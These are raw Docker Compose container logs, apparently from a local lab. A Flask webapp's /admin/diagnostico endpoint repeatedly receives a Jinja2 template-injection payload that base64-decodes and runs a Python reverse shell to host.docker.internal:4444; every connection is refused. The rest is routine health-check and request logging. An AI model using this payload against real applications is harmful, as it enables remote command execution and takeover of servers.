nginx-1  | 2026-05-12T13:53:19.209300201Z /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
db-1      | 2026-05-12T14:04:17.015005515Z 2026-05-12 14:04:17.013 UTC [97] LOG:  could not receive data from client: Connection reset by peer
db-1      | 2026-05-12T14:41:26.353373870Z 2026-05-12 14:41:26.352 UTC [210] LOG:  could not receive data from client: Connection reset by peer
webapp-1  | 2026-05-12T13:56:30.482100334Z 172.19.0.3 - - [12/May/2026 13:56:30] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:56:30.503679917Z 172.19.0.3 - - [12/May/2026 13:56:30] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:56:49.653379302Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:49.653415010Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:49.653417927Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:49.666703927Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:49.666723885Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:49.666725552Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:49.679402010Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:49.679420718Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:49.679422760Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:49.682445052Z 172.19.0.3 - - [12/May/2026 13:56:49] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:56:49.701576427Z 172.19.0.3 - - [12/May/2026 13:56:49] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:56:53.279647637Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:53.279671428Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:53.279674012Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:53.295312345Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:53.295335678Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:53.295337678Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:53.311938262Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:53.311956928Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:53.311958762Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:53.315339428Z 172.19.0.3 - - [12/May/2026 13:56:53] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:56:53.330327720Z 172.19.0.3 - - [12/May/2026 13:56:53] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:56:54.198297970Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:54.198318804Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:54.198320762Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:54.214507304Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:54.214566095Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:54.214580095Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:54.229419095Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:54.229435345Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:54.229437054Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:54.232199429Z 172.19.0.3 - - [12/May/2026 13:56:54] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:56:54.247710887Z 172.19.0.3 - - [12/May/2026 13:56:54] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:56:54.798861012Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:54.798881887Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:54.798883679Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:54.815572554Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:54.815590679Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:54.815592471Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:54.826933137Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:54.826950721Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:54.826952637Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:54.829219762Z 172.19.0.3 - - [12/May/2026 13:56:54] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:56:54.841630971Z 172.19.0.3 - - [12/May/2026 13:56:54] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T13:56:55.487434596Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:55.487454513Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:55.487457179Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:55.505626763Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:55.505646513Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:55.505648429Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:55.524917763Z Traceback (most recent call last):
webapp-1  | 2026-05-12T13:56:55.524934096Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T13:56:55.524935638Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T13:56:55.527604679Z 172.19.0.3 - - [12/May/2026 13:56:55] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T13:56:55.547087096Z 172.19.0.3 - - [12/May/2026 13:56:55] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:02:25.758813170Z 172.19.0.3 - - [12/May/2026 14:02:25] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:33:34.887354353Z 172.19.0.3 - - [12/May/2026 14:33:34] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:34:13.971154788Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:34:13.971182413Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:34:13.971184913Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:34:13.997170122Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:34:13.997217247Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:34:13.997220247Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:34:14.001870872Z 172.19.0.3 - - [12/May/2026 14:34:14] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T14:34:35.698982507Z 172.19.0.3 - - [12/May/2026 14:34:35] "GET /admin/diagnostico HTTP/1.1" 200 -
webapp-1  | 2026-05-12T14:34:35.718793840Z 172.19.0.3 - - [12/May/2026 14:34:35] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:35:43.751151748Z 172.19.0.3 - - [12/May/2026 14:35:43] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:38:28.625815077Z 172.19.0.3 - - [12/May/2026 14:38:28] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:38:46.440272960Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:38:46.440303252Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:38:46.440326085Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:38:46.457922043Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:38:46.457946585Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:38:46.457948585Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:38:46.471143293Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:38:46.471158918Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:38:46.471160543Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:38:46.473843877Z 172.19.0.3 - - [12/May/2026 14:38:46] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T14:38:46.493955210Z 172.19.0.3 - - [12/May/2026 14:38:46] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
webapp-1  | 2026-05-12T14:39:48.620437115Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:39:48.620506031Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:39:48.620510115Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:39:48.636142781Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:39:48.636160156Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:39:48.636162323Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:39:48.651761406Z Traceback (most recent call last):
webapp-1  | 2026-05-12T14:39:48.651811740Z   File "<stdin>", line 1, in <module>
webapp-1  | 2026-05-12T14:39:48.651814531Z ConnectionRefusedError: [Errno 111] Connection refused
webapp-1  | 2026-05-12T14:39:48.654933573Z 172.19.0.3 - - [12/May/2026 14:39:48] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
webapp-1  | 2026-05-12T14:39:48.670257115Z 172.19.0.3 - - [12/May/2026 14:39:48] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
backend-1  | 2026-05-12T13:53:13.511387574Z  * Serving Flask app 'app'
backend-1  | 2026-05-12T13:53:13.511402365Z  * Debug mode: off
backend-1  | 2026-05-12T13:53:13.512760490Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
backend-1  | 2026-05-12T13:53:13.512763657Z  * Running on all addresses (0.0.0.0)
backend-1  | 2026-05-12T13:53:13.512764740Z  * Running on http://127.0.0.1:5000
backend-1  | 2026-05-12T13:53:13.512765449Z  * Running on http://172.20.0.3:5000
backend-1  | 2026-05-12T13:53:13.512787990Z [33mPress CTRL+C to quit[0m
backend-1  | 2026-05-12T13:53:18.461504701Z 127.0.0.1 - - [12/May/2026 13:53:18] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:23.485020745Z 127.0.0.1 - - [12/May/2026 13:53:23] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:28.520781289Z 127.0.0.1 - - [12/May/2026 13:53:28] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:33.548026166Z 127.0.0.1 - - [12/May/2026 13:53:33] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:38.590069086Z 127.0.0.1 - - [12/May/2026 13:53:38] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:43.617592713Z 127.0.0.1 - - [12/May/2026 13:53:43] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:48.646308382Z 127.0.0.1 - - [12/May/2026 13:53:48] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:50.503320633Z 172.20.0.4 - - [12/May/2026 13:53:50] "GET /empleados HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:53.680775426Z 127.0.0.1 - - [12/May/2026 13:53:53] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:53:58.703171428Z 127.0.0.1 - - [12/May/2026 13:53:58] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:03.730699139Z 127.0.0.1 - - [12/May/2026 13:54:03] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:08.787700183Z 127.0.0.1 - - [12/May/2026 13:54:08] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:13.816439727Z 127.0.0.1 - - [12/May/2026 13:54:13] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:18.845234271Z 127.0.0.1 - - [12/May/2026 13:54:18] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:23.865548190Z 127.0.0.1 - - [12/May/2026 13:54:23] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:28.887189693Z 127.0.0.1 - - [12/May/2026 13:54:28] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:33.908409445Z 127.0.0.1 - - [12/May/2026 13:54:33] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:38.933220281Z 127.0.0.1 - - [12/May/2026 13:54:38] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:43.952878533Z 127.0.0.1 - - [12/May/2026 13:54:43] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:47.844605910Z 172.20.0.4 - - [12/May/2026 13:54:47] "GET /empleados HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:48.972206411Z 127.0.0.1 - - [12/May/2026 13:54:48] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:53.995699205Z 127.0.0.1 - - [12/May/2026 13:54:53] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:54:59.021757666Z 127.0.0.1 - - [12/May/2026 13:54:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:04.055958001Z 127.0.0.1 - - [12/May/2026 13:55:04] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:09.084828087Z 127.0.0.1 - - [12/May/2026 13:55:09] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:14.113928214Z 127.0.0.1 - - [12/May/2026 13:55:14] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:19.135047217Z 127.0.0.1 - - [12/May/2026 13:55:19] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:24.167936344Z 127.0.0.1 - - [12/May/2026 13:55:24] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:29.188187013Z 127.0.0.1 - - [12/May/2026 13:55:29] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:34.206355057Z 127.0.0.1 - - [12/May/2026 13:55:34] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:39.231739976Z 127.0.0.1 - - [12/May/2026 13:55:39] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:44.259053562Z 127.0.0.1 - - [12/May/2026 13:55:44] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:49.277660356Z 127.0.0.1 - - [12/May/2026 13:55:49] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:54.306168025Z 127.0.0.1 - - [12/May/2026 13:55:54] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:55:59.328540611Z 127.0.0.1 - - [12/May/2026 13:55:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:04.357834655Z 127.0.0.1 - - [12/May/2026 13:56:04] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:09.395278157Z 127.0.0.1 - - [12/May/2026 13:56:09] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:14.421490785Z 127.0.0.1 - - [12/May/2026 13:56:14] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:19.442963246Z 127.0.0.1 - - [12/May/2026 13:56:19] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:24.465215623Z 127.0.0.1 - - [12/May/2026 13:56:24] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:29.490448125Z 127.0.0.1 - - [12/May/2026 13:56:29] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:34.513950086Z 127.0.0.1 - - [12/May/2026 13:56:34] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:39.541945755Z 127.0.0.1 - - [12/May/2026 13:56:39] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:44.574306841Z 127.0.0.1 - - [12/May/2026 13:56:44] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:49.608981052Z 127.0.0.1 - - [12/May/2026 13:56:49] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:54.629707762Z 127.0.0.1 - - [12/May/2026 13:56:54] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:56:59.656831015Z 127.0.0.1 - - [12/May/2026 13:56:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:04.684771142Z 127.0.0.1 - - [12/May/2026 13:57:04] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:09.718307603Z 127.0.0.1 - - [12/May/2026 13:57:09] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:14.751967230Z 127.0.0.1 - - [12/May/2026 13:57:14] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:19.778509733Z 127.0.0.1 - - [12/May/2026 13:57:19] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:24.800643777Z 127.0.0.1 - - [12/May/2026 13:57:24] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:29.822920112Z 127.0.0.1 - - [12/May/2026 13:57:29] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:34.846882740Z 127.0.0.1 - - [12/May/2026 13:57:34] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:39.882482784Z 127.0.0.1 - - [12/May/2026 13:57:39] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:44.906343703Z 127.0.0.1 - - [12/May/2026 13:57:44] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:49.925530664Z 127.0.0.1 - - [12/May/2026 13:57:49] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:54.947115749Z 127.0.0.1 - - [12/May/2026 13:57:54] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:57:59.973850418Z 127.0.0.1 - - [12/May/2026 13:57:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:05.001010421Z 127.0.0.1 - - [12/May/2026 13:58:05] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:10.026580173Z 127.0.0.1 - - [12/May/2026 13:58:10] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:15.051235259Z 127.0.0.1 - - [12/May/2026 13:58:15] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:20.077859928Z 127.0.0.1 - - [12/May/2026 13:58:20] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:25.096573264Z 127.0.0.1 - - [12/May/2026 13:58:25] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:30.121903058Z 127.0.0.1 - - [12/May/2026 13:58:30] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:35.142703894Z 127.0.0.1 - - [12/May/2026 13:58:35] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:40.192238688Z 127.0.0.1 - - [12/May/2026 13:58:40] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:45.227330815Z 127.0.0.1 - - [12/May/2026 13:58:45] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:50.249918567Z 127.0.0.1 - - [12/May/2026 13:58:50] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:58:55.277960737Z 127.0.0.1 - - [12/May/2026 13:58:55] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:00.303143281Z 127.0.0.1 - - [12/May/2026 13:59:00] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:05.326942616Z 127.0.0.1 - - [12/May/2026 13:59:05] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:10.353595577Z 127.0.0.1 - - [12/May/2026 13:59:10] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:15.373548454Z 127.0.0.1 - - [12/May/2026 13:59:15] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:20.397431373Z 127.0.0.1 - - [12/May/2026 13:59:20] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:25.434736001Z 127.0.0.1 - - [12/May/2026 13:59:25] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:30.459189337Z 127.0.0.1 - - [12/May/2026 13:59:30] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:35.486088381Z 127.0.0.1 - - [12/May/2026 13:59:35] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:40.528505008Z 127.0.0.1 - - [12/May/2026 13:59:40] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:45.562054469Z 127.0.0.1 - - [12/May/2026 13:59:45] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:50.591560638Z 127.0.0.1 - - [12/May/2026 13:59:50] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T13:59:55.620102224Z 127.0.0.1 - - [12/May/2026 13:59:55] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T14:00:00.644315226Z 127.0.0.1 - - [12/May/2026 14:00:00] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-05-12T14:00:05.669011728Z 127.0.0.1 - - [12/May/2026 14:00:05] "GET /health HTTP/1.1" 200 -
